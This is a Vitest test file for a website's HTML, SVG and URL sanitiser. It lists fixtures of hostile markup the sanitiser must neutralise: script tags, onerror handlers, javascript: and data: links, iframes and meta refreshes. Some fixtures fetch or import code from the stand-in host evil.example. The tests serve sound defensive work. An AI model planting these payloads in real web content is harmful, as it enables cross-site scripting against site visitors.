import { describe, expect, test } from 'vitest';
import {
  sanitizeInlineSvg,
  sanitizeRichText,
  sanitizeUrl,
} from '../src/flowstarter/site-html-sanitizer';

/**
 * The fixtures are the point of this file: each one is a way a brief or a
 * change request could carry markup into `src/content/*.md` and out through
 * `set:html`. A sanitiser is only as good as the list of things it was asked
 * about, so the list lives here and grows rather than the implementation
 * being trusted on its own account.
 */
const HOSTILE = {
  script: '<p>Hello</p><script>fetch("https://evil.example")</script>',
  scriptSpaced: '<p>hi</p><script >alert(1)</script >',
  onerror: '<img src=x onerror="import(\'https://evil.example/c.js\')">',
  onerrorUnquoted: '<img src=x onerror=alert(1)>',
  javascriptHref: '<a href="javascript:alert(1)">click</a>',
  javascriptTabbed: '<a href="java\tscript:alert(1)">click</a>',
  dataHref: '<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>',
  metaRefresh:
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  iframe: '<iframe src="https://evil.example"></iframe>',
  base: '<base href="https://evil.example/">',
  form: '<form action="https://evil.example"><input name="email"></form>',
  svgOnload: '<svg><g><animate onbegin="alert(1)"/></g></svg>',
  nestedSvgOnload:
    '<p>hi<svg><foreignObject><img src=x onload="alert(1)"></foreignObject></svg></p>',
  // A YAML string with `<` escapes arrives here already decoded, which
  // is the case that matters: the sanitiser sees real tags.
  unicodeEscaped: JSON.parse(
    '"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"',
  ) as string,
  // And the already-escaped spelling has to stay inert text, not be decoded.
  entityEscaped: '&lt;script&gt;alert(1)&lt;/script&gt;',
  unclosedScript: '<script>alert(1)',
  srcdoc: '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
};

describe('sanitizeRichText', () => {
  test('keeps the formatting a client actually writes', () => {
    const input =
      '<p>We help <strong>small teams</strong> <em>ship</em>.<br />Since 2019.</p>' +
      '<ul><li>One</li><li>Two</li></ul><h2>Our work</h2><h3>Recent</h3>' +
      '<span>Quietly</span>';
    expect(sanitizeRichText(input)).toBe(input.replace('<br />', '<br />'));
  });

  test('rewrites a link to https with rel="noopener noreferrer"', () => {
    expect(
      sanitizeRichText(
        '<a href="https://acme.example" target="_blank">Acme</a>',
      ),
    ).toBe('<a href="https://acme.example" rel="noopener noreferrer">Acme</a>');
  });

  test('drops an unknown wrapper but keeps the words inside it', () => {
    expect(sanitizeRichText('<div class="x">Hello <b>there</b></div>')).toBe(
      'Hello there',
    );
  });

  test.each([
    ['script', HOSTILE.script],
    ['spaced script tag', HOSTILE.scriptSpaced],
    ['unterminated script', HOSTILE.unclosedScript],
    ['unicode-escaped script', HOSTILE.unicodeEscaped],
    ['svg with an animation handler', HOSTILE.svgOnload],
    ['nested svg with onload', HOSTILE.nestedSvgOnload],
  ])('removes a %s entirely', (_name, input) => {
    const out = sanitizeRichText(input);
    expect(out.toLowerCase()).not.toContain('<script');
    expect(out.toLowerCase()).not.toContain('alert(');
    expect(out.toLowerCase()).not.toContain('evil.example');
    expect(out.toLowerCase()).not.toContain('<svg');
  });

  test.each([
    ['inline event handler', HOSTILE.onerror],
    ['unquoted event handler', HOSTILE.onerrorUnquoted],
  ])('removes an %s', (_name, input) => {
    const out = sanitizeRichText(input).toLowerCase();
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('<img');
  });

  test.each([
    ['javascript: href', HOSTILE.javascriptHref],
    ['tab-obfuscated javascript: href', HOSTILE.javascriptTabbed],
    ['data: href', HOSTILE.dataHref],
  ])('drops the href of a %s but keeps the words', (_name, input) => {
    const out = sanitizeRichText(input);
    expect(out.toLowerCase()).not.toContain('javascript');
    expect(out.toLowerCase()).not.toContain('data:');
    expect(out).toContain('click');
  });

  test.each([
    ['meta refresh', HOSTILE.metaRefresh],
    ['iframe', HOSTILE.iframe],
    ['iframe with srcdoc', HOSTILE.srcdoc],
    ['base tag', HOSTILE.base],
    ['form', HOSTILE.form],
  ])('removes a %s', (_name, input) => {
    const out = sanitizeRichText(input).toLowerCase();
    for (const tag of ['<meta', '<iframe', '<base', '<form', '<input']) {
      expect(out).not.toContain(tag);
    }
  });

  test('never decodes an entity back into a tag', () => {
    expect(sanitizeRichText(HOSTILE.entityEscaped)).toBe(HOSTILE.entityEscaped);
  });

  test('escapes a stray angle bracket instead of inventing a tag', () => {
    expect(sanitizeRichText('Prices < 100 & rising > fast')).toBe(
      'Prices &lt; 100 & rising &gt; fast',
    );
  });

  test('closes what it opened, however badly nested the input was', () => {
    expect(sanitizeRichText('<p><strong>bold')).toBe(
      '<p><strong>bold</strong></p>',
    );
    expect(sanitizeRichText('<strong>a</em>b</strong>')).toBe(
      '<strong>ab</strong>',
    );
  });

  test('returns an empty string for anything that is not a string', () => {
    expect(sanitizeRichText(undefined)).toBe('');
    expect(sanitizeRichText(42)).toBe('');
    expect(sanitizeRichText({ toString: () => '<script>x</script>' })).toBe('');
  });
});

describe('sanitizeInlineSvg', () => {
  test('keeps a template icon exactly as the design system drew it', () => {
    const icon =
      '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">' +
      '<path d="M8 21.2a15 15 0 0 1 4-10" stroke="currentColor" stroke-width="2"></path></svg>';
    expect(sanitizeInlineSvg(icon)).toContain('viewBox="0 0 24 24"');
    expect(sanitizeInlineSvg(icon)).toContain('<path');
  });

  test('strips a handler from an icon and keeps the shape', () => {
    const out = sanitizeInlineSvg(
      '<svg onload="alert(1)"><path d="M0 0" onclick="alert(2)"/></svg>',
    );
    expect(out).not.toContain('onload');
    expect(out).not.toContain('onclick');
    expect(out).toContain('<path d="M0 0" />');
  });

  test('removes the elements an SVG runs code with', () => {
    const out = sanitizeInlineSvg(
      '<svg><script>alert(1)</script><use href="#x"/><foreignObject><img src=x onerror=alert(1)></foreignObject><circle r="4"/></svg>',
    );
    expect(out).not.toContain('script');
    expect(out).not.toContain('use');
    expect(out).not.toContain('foreignObject');
    expect(out).not.toContain('onerror');
    expect(out).toContain('<circle r="4" />');
  });

  test('refuses anything that is not an svg', () => {
    expect(sanitizeInlineSvg('<p>hello</p>')).toBe('');
    expect(sanitizeInlineSvg('<img src=x onerror=alert(1)>')).toBe('');
    expect(sanitizeInlineSvg('')).toBe('');
  });
});

describe('sanitizeUrl', () => {
  test.each([
    ['https://acme.example/pricing', 'https://acme.example/pricing'],
    ['mailto:hello@acme.example', 'mailto:hello@acme.example'],
    ['tel:+44123', 'tel:+44123'],
    ['/contact', '/contact'],
    ['#book', '#book'],
    ['images/hero.webp', 'images/hero.webp'],
  ])('keeps %s', (input, expected) => {
    expect(sanitizeUrl(input)).toBe(expected);
  });

  test.each([
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    'java\tscript:alert(1)',
    ' javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    '//evil.example/path',
    'http://acme.example',
  ])('refuses %s', (input) => {
    expect(sanitizeUrl(input)).toBe('#');
  });

  test('takes the fallback it is given', () => {
    expect(sanitizeUrl('javascript:alert(1)', '')).toBe('');
  });
});
